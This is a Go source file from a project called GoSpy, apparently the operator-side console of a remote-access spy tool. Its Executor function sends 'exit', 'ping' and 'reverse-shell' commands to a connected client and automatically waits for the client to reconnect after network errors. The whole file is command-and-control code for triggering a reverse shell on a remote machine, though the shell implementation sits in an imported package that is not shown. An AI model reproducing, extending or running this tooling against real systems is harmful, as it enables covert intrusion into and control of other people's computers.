package serverprompt

import (
	"fmt"
	"github.com/psidex/GoSpy/internal/commands"
	"github.com/psidex/GoSpy/internal/server"
	"io"
	"net"
	"os"
	"strings"
)

// Executor is the executor function for the go-prompt prompt.
// The instantiated ConMan is passed as a pointer to its fields can be changed.
func Executor(s *server.ConMan, in string) {
	in = strings.TrimSpace(in)
	blocks := strings.Split(in, " ")

	var err error // So the it can be inspected after the switch.

	switch blocks[0] {

	case "exit":
		_ = commands.ExitSend(s.CmdCon)
		os.Exit(0)

	case "ping":
		err = commands.PingSend(s.CmdCon)
		if err != nil {
			fmt.Printf("ping error: %s\n", err.Error())
			break
		}

	case "reverse-shell":
		err = commands.ReverseShellSend(*s)
		if err != nil {
			fmt.Printf("reverse-shell error: %s\n", err.Error())
		}

	}

	if _, isNetErr := err.(net.Error); isNetErr == true || err == io.EOF {
		fmt.Println("\nNetwork error detected, dropping client and waiting for reconnect...")
		_ = s.CmdCon.Close()
		s.CmdCon = s.WaitForNewConnection()
		fmt.Println("Successful reconnect from client")
	}
}
